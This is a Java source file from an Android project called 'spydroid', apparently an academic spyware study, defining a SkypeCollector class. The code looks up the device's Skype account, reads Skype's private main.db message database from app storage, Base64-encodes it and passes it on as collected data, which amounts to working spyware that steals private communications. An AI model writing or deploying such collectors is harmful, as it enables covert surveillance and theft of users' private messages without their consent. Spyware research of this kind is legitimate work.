package edu.duke.spydroid.collectors;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import edu.duke.spydroid.R;
import edu.duke.spydroid.StaticCollector;
import edu.duke.spydroid.util.Base64Coder;

public class SkypeCollector extends StaticCollector{

	// user name hard coded for now, but can easily grabbed from AccountInfo Collector 
	private static final String SKYPE_ACCOUNT="com.skype.contacts.sync";
	
	public SkypeCollector(Context ctxt, String preferenceKey, Service service) {
		super(ctxt, preferenceKey, service);
		setDisplayTitle(R.string.title_skype_collector);
	}

	@Override
	protected boolean onCollect(Intent intent) {
		AccountManager am=(AccountManager) getContext().getSystemService(Context.ACCOUNT_SERVICE);
		Account[] accounts = am.getAccounts();
		String account_id="";
		for (Account account : accounts) {
			String type=account.type;
			if (type.equals(SKYPE_ACCOUNT))
			{
				account_id = account.name;
			}
		}
		
		// No Skype Account found
		if (account_id.equals(""))
			return false;
		
		StringBuffer fileSystemInfo = new StringBuffer();
		try {
			BufferedInputStream in=new BufferedInputStream(new FileInputStream("/data/data/com.skype.raider/files/"+account_id+"/main.db"));
			int length=in.available();
			byte[] buffer=new byte[length];
			while (true)
			{
				int len=in.read(buffer);
				if (len<=0)
					break;
				char[] encoded=Base64Coder.encode(buffer);
				fileSystemInfo.append(encoded);
			}
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		
		setData(fileSystemInfo);
		
		return true;
	}
}
